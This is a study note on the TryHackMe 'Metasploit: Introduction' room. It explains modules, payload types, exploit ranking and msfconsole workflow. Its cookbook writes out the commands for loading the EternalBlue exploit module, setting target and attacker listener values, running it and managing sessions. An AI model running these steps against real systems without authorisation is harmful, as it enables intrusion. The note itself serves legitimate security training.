---
type: resource-note
status: done
created: 2026-02-28
updated: 2026-03-12
tags: [security-writeup, tryhackme, metasploit, exploitation-basics]
source: "TryHackMe: Metasploit: Introduction"
platform: tryhackme
room: "Metasploit: Introduction"
slug: metasploit-introduction
path: TryHackMe/00-foundations/metasploit-introduction.md
topic: 00-foundations
domain: [exploitation-basics]
skills: [msfconsole, module-discovery, payload-selection, auth-session]
artifacts: [concept-notes, pattern-card, cookbook]
sanitized: true
---

# Metasploit: Introduction

## Summary

* Metasploit Framework is the open-source, CLI-oriented edition of Metasploit; `msfconsole` is the primary interface.
* The framework is organized around modules: `auxiliary`, `exploit`, `payload`, `post`, `encoder`, `nop`, and `evasion`.
* Core mental model: **vulnerability** is the flaw, **exploit** is the code that triggers it, **payload** is the code that achieves the operator’s intended effect.
* Payloads split into **single/stageless** and **staged**. Naming is a useful clue: underscore often indicates inline/single payload composition, while slash-separated names often indicate staged payload families.
* Daily workflow in `msfconsole`: `search` → `use` → `show options` → `set / setg` → `check` (if supported) → `run` / `exploit` → `sessions`.
* Metasploit exploit “rank” is a reliability signal, not a guarantee. `excellent` does not mean risk-free; `average` does not mean unusable.

## Key Concepts

### 1.1 Framework structure

Main components you interact with most:

* `msfconsole`

  * main REPL / command-line interface
* Modules

  * purpose-built components for scanning, exploitation, payload delivery, post-exploitation, etc.
* Stand-alone tools

  * examples commonly mentioned in the Metasploit ecosystem: `msfvenom`, `pattern_create`, `pattern_offset`

### 1.2 Terminology that must stay sharp

* Vulnerability

  * a design, implementation, or logic flaw in the target
* Exploit

  * code that leverages the vulnerability
* Payload

  * code executed after successful exploitation to produce the desired outcome

This is the clean separation to remember:

```text
vulnerability -> exploit -> payload -> session / effect
```

### 1.3 Module taxonomy

* `auxiliary`

  * scanners, brute-force helpers, crawlers, protocol probes, capture servers
* `exploit`

  * modules that leverage a specific flaw to gain code execution or another effect
* `payload`

  * code run on the target after exploitation
* `post`

  * modules used after access/session creation
* `encoder`

  * encoding helpers; historically used to alter payload representation
* `nop`

  * no-operation sled/buffer helpers, especially relevant in exploit development contexts
* `evasion`

  * modules oriented toward bypassing or reducing detection

Important operational note:

* Encoders are **not** magic AV bypass. Modern detection does more than signature comparison.

### 1.4 Payload structure: singles, stagers, stages, adapters

Metasploit payload tree usually includes:

* `singles`

  * self-contained payloads
* `stagers`

  * small bootstrap components that establish a communication channel
* `stages`

  * larger follow-on payload components delivered after the stager succeeds
* `adapters`

  * wrappers/converters that package payloads into alternate execution forms

Naming heuristic from the room (and generally useful):

* Single / inline / stageless style:

  * `generic/shell_reverse_tcp`
* Staged style:

  * `windows/x64/shell/reverse_tcp`

Interpretation:

* `shell_reverse_tcp` with underscore is a single payload family name.
* `shell/reverse_tcp` with slash conventionally denotes a staged payload composition.

Example room-style question logic:

* `windows/x64/pingback_reverse_tcp` is treated as a **single** payload because of the underscore naming pattern.

### 1.5 Exploit ranking

Metasploit exploit rank is a reliability/impact heuristic used to prioritize modules.

Descending order commonly used:

* `ExcellentRanking`
* `GreatRanking`
* `GoodRanking`
* `NormalRanking`
* `AverageRanking`
* `LowRanking`
* `ManualRanking`

How to read this correctly:

* `excellent`

  * expected to be very reliable and unlikely to crash the target in normal use
* `great/good/normal`

  * progressively more assumptions, version specificity, or operational caveats
* `average/low/manual`

  * unstable, target-sensitive, or highly operator-dependent

Do not over-trust rank.

* A low-ranked exploit may work perfectly in the exact target context.
* A high-ranked exploit can still fail, destabilize a target, or produce side effects.

### Msfconsole workflow

#### 2.1 Core console commands

* `help`

  * built-in help, also supports command-specific help such as `help set`
* `history`

  * print prior commands
* `search <term>`

  * locate relevant modules
* `use <module>` or `use <index>`

  * enter module context
* `show options`

  * list required/optional datastore values in current context
* `show payloads`

  * list compatible payloads for current exploit module
* `info`

  * detailed module metadata and references
* `back`

  * leave current module context

Useful mental model:

* `msfconsole` is **context-managed**.
* Settings made with `set` usually stay in the current module context only.
* Settings made with `setg` are global defaults for the current Metasploit session.

#### 2.2 Prompt states you should recognize instantly

You may encounter these prompt classes:

* regular shell

  * e.g. `root@host:~#`
* Metasploit console prompt

  * e.g. `msf6 >`
* module context prompt

  * e.g. `msf6 exploit(...) >`
* Meterpreter prompt

  * e.g. `meterpreter >`
* target OS shell

  * e.g. `C:\Windows\system32>`

Interpretation:

* `msf6 >`

  * global framework context, not yet inside a module
* `msf6 exploit(...) >`

  * module-specific context; this is where most `set`, `show options`, `run` work happens
* `meterpreter >`

  * interactive Meterpreter agent session
* target shell prompt

  * ordinary command shell on the remote host

#### 2.3 Datastore parameters you will use constantly

Frequent options:

* `RHOSTS`

  * target host(s); can be a single IP, CIDR, range, or file input
* `RPORT`

  * remote service port
* `PAYLOAD`

  * payload to pair with exploit
* `LHOST`

  * local/listener address on the attacking box
* `LPORT`

  * local/listener port on the attacking box
* `SESSION`

  * existing session id for post-exploitation modules

Setting and clearing:

* `set PARAM VALUE`
* `setg PARAM VALUE`
* `unset PARAM`
* `unset all`
* `unsetg PARAM`

Operational rule:

* Always run `show options` after changing context or parameters.
* Do not assume defaults are correct for your target.

#### 2.4 Running modules

Common launch commands:

* `run`
* `exploit`

Important detail:

* `run` is effectively the operator-friendly alias for module execution.
* `check` should be used first when the module supports non-invasive vulnerability checking.
* `exploit -z` backgrounds the session immediately after opening it.

### Sessions

A **session** is the communication channel created after successful exploitation/payload execution.

Session handling basics:

* `sessions`

  * list active sessions
* `sessions -i <ID>`

  * interact with a session
* `background`

  * send Meterpreter/session interaction to background
* `CTRL+Z`

  * common shortcut for backgrounding interaction

Think of sessions as reusable footholds.

* exploit modules try to create them
* post modules consume them

## Pattern Cards

### 4.1 Module selection card

* Need to scan or enumerate without exploitation?

  * start in `auxiliary`
* Need to trigger a specific vulnerability?

  * start in `exploit`
* Already have a foothold and want to gather/escalate/pivot?

  * move to `post`

### 4.2 Safe operator loop card

```text
search -> info -> use -> show options -> set -> check -> run -> sessions
```

This is the right default sequence for lab work.

### 4.3 `set` vs `setg` card

* `set`

  * current module only
* `setg`

  * global default across modules for the current framework session

Use `setg` sparingly.

* Good for `RHOSTS`, maybe `LHOST`
* Bad when you forget it is still set and later hit the wrong target

### 4.4 Payload choice card

* Want simplicity and fewer moving parts?

  * prefer single/stageless payloads
* Want smaller initial delivery footprint or staged transport behavior?

  * consider staged payloads
* Need interactive post-exploitation tooling?

  * Meterpreter is powerful but noisier and more specialized than a basic shell

## Command Cookbook

### 5.1 Discover and inspect

```bash
msfconsole
search apache
search type:auxiliary telnet
info auxiliary/scanner/ssh/ssh_login
```

### 5.2 Enter module context and inspect options

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
show payloads
info
```

### 5.3 Set datastore values

```bash
set RHOSTS TARGET_IP
set RPORT 445
set LHOST ATTACKER_IP
set LPORT 6666
setg RHOSTS 10.10.19.23
unset PAYLOAD
unset all
```

### 5.4 Run and manage sessions

```bash
check
run
exploit
exploit -z
sessions
sessions -i 1
background
```

## Notes on the room’s example module

The room uses `exploit/windows/smb/ms17_010_eternalblue` as a teaching example because it illustrates:

* module context switching
* required options such as `RHOSTS`/`RPORT`
* payload pairing and session creation
* exploit ranking and reliability caveats

Historical relevance:

* EternalBlue is associated with MS17-010 and the SMBv1 bug class that was later used in WannaCry-era campaigns.
* Treat it as foundational background, not as a default “go exploit this” pattern.

## Defensive / professional reading of Metasploit

Even if your goal is blue-team or vuln research, Metasploit matters because it teaches:

* how offensive modules model vulnerabilities
* what attacker workflows look like in practice
* what payload/session artifacts defenders should expect
* why exploit reliability and target validation matter

This is one reason `check`, precise targeting, and session discipline are not just convenience features; they are operational hygiene.

## Command Workflow Cheatsheet

| Goal                         | Command pattern                | Why it matters                                          |
| ---------------------------- | ------------------------------ | ------------------------------------------------------- |
| Search modules               | `search <keyword>`             | Find relevant modules quickly                           |
| Filter by type               | `search type:auxiliary <term>` | Reduce noise in large result sets                       |
| Inspect module               | `info <module>`                | Read rank, references, targets, and notes               |
| Enter module                 | `use <module>`                 | Set context                                             |
| Review parameters            | `show options`                 | Confirm required values before execution                |
| Review payload choices       | `show payloads`                | Avoid incompatible or noisy payload picks               |
| Set local values             | `set PARAM VALUE`              | Module-scoped datastore change                          |
| Set reusable defaults        | `setg PARAM VALUE`             | Reuse values across modules in the same console session |
| Remove a value               | `unset PARAM`                  | Clear a single datastore entry                          |
| Clear current module values  | `unset all`                    | Reset module-scoped state                               |
| Validate target if supported | `check`                        | Reduce unnecessary exploit attempts                     |
| Execute module               | `run` / `exploit`              | Launch scanner, auxiliary, or exploit module            |
| Background new session       | `exploit -z`                   | Keep console control immediately after session creation |
| List sessions                | `sessions`                     | View current footholds                                  |
| Interact with one session    | `sessions -i <ID>`             | Enter shell or Meterpreter                              |
| Background session           | `background` or `CTRL+Z`       | Return to console without killing access                |

## Common Prompt States

```mermaid
flowchart TD
  A[Regular shell
root@host:~#] --> B[Launch msfconsole]
  B --> C[msf6 >
Global framework context]
  C --> D[use <module>]
  D --> E[msf6 exploit(...) >
Module context]
  E --> F[run / exploit]
  F --> G[meterpreter >
Meterpreter session]
  F --> H[C:\Windows\system32>
Target shell]
  G --> I[background]
  H --> I
  I --> E
  E --> J[back]
  J --> C
```

Prompt interpretation rules:

* `msf6 >` means you are in framework scope, not yet inside a specific module.
* `msf6 exploit(...) >` or `msf6 auxiliary(...) >` means context-specific datastore commands apply.
* `meterpreter >` means you are talking to the Meterpreter agent, not the local operating system shell.
* A Windows or Linux shell prompt means commands run on the target host.

## Operator Decision Matrix

| Situation                                   | Better first move                                       | Rationale                                              |
| ------------------------------------------- | ------------------------------------------------------- | ------------------------------------------------------ |
| You only have a product name or CVE         | `search <keyword>` then `info`                          | Prevents jumping into the wrong module                 |
| You found multiple exploits                 | Prefer higher-rank modules first, but still read `info` | Rank is a heuristic, not a safety guarantee            |
| You will reuse the same target repeatedly   | `setg RHOSTS <IP>`                                      | Saves typing across modules                            |
| You are switching between different targets | Avoid `setg` or clear it deliberately                   | Reduces operator mistakes                              |
| Module supports `check`                     | Use `check` before `run`                                | Safer target validation                                |
| You need clean reporting                    | Use simple proof payloads where appropriate             | Easier to explain impact without unnecessary noise     |
| You already have a foothold                 | Move into `post` modules                                | Exploit phase is over; session is now your pivot point |

## Pitfalls

* Forgetting module context and assuming `set` values survive `back` / `use` changes.
* Trusting default `RPORT`, `PAYLOAD`, or target selection without verification.
* Treating exploit rank as certainty.
* Mixing up local shell commands, Meterpreter commands, and `msfconsole` commands.
* Leaving `setg` values in place and later hitting the wrong host.

## Takeaways

* Metasploit is not just “an exploit launcher”; it is a modular workflow engine for offensive and research tasks.
* If you understand **module context + datastore + payload structure + sessions**, you understand the framework’s core grammar.
* The room is fundamentally about becoming fluent in the console, not memorizing one exploit.

## References

* Rapid7 Metasploit overview and framework documentation
* Rapid7 Metasploit module reference
* Rapid7 / GitHub Metasploit exploit ranking wiki
* Rapid7 payload documentation and staged vs stageless explanations
* Rapid7 session management documentation

## CN: EN Glossary (mini)

* Exploit: 利用代码
* Vulnerability: 漏洞
* Payload: 载荷
* Auxiliary module: 辅助模块
* Post module: 后渗透模块
* Encoder: 编码器
* NOP: 空操作
* Evasion: 规避模块
* Stager: 分阶段载荷的第一阶段引导器
* Stage: 分阶段载荷的后续主体部分
* Single / stageless payload: 单体/无分阶段载荷
* Session: 会话
* Datastore: 模块参数存储区
* Meterpreter: Metasploit 的高级交互式载荷/会话环境
